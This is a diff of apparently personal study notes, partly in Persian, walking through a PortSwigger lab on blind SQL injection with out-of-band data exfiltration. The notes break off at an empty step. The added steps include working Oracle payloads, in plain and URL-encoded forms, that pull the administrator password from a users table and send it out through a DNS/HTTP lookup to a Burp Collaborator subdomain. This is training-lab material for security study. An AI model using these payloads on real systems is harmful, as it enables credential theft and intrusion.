@@ -106,15 +106,7 @@ Step 5:
 Lab: Blind SQL injection with out-of-band data exfiltration
 https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
 
-
-
-
-
-
-
-
-
-Read more DNS lookup with data exfiltration:
+    Read more DNS lookup with data exfiltration:
     DNS lookup with data exfiltration جستجوی DNS با استخراج داده ها
         You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data. 
         شما می توانید باعث شوید پایگاه داده یک جستجوی DNS به یک دامنه خارجی حاوی نتایج یک پرس و جو تزریق شده انجام دهد. برای انجام این کار، باید از Burp Collaborator برای ایجاد یک زیر دامنه منحصر به فرد Burp Collaborator که در حمله خود استفاده می کنید، استفاده کنید و سپس از سرور Collaborator نظرسنجی کنید تا جزئیات هر گونه تعامل DNS، از جمله داده های استخراج شده را بازیابی کنید.
@@ -141,8 +133,33 @@ Read more DNS lookup with data exfiltration:
         The following technique works on Windows only:
         SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 
+vulnerable parameter - tracking cookie
 
+Target:
+1- Exploit SQLi to output the password of the administrator user
+2- Login as the administrator user
 
+****  dependency: BurpSuite Professional - I taught before How Install it 
+
+Step 1: Open Burp + On FoxyProxy Extension
+
+Step 2: Get Packet and send to Repeater
+
+Step 3: SQL injection cheat sheet --> https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+Step 4: Go down to "DNS lookup with data exfiltration"
+
+Step 5: Get Query Oracle 
+-->   ' ||   (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
+
+Step 6: Tab: Burp > Burp Collaborator Client > Copy to clipboard
+
+Step 7: Add to payload + Encode it
+-->     '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.cr7gwsez46x00mbszjwjnh6ht8z2nr.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+Step 8: This Query get password + Copy that
+
+Step 9: 
 
 
 
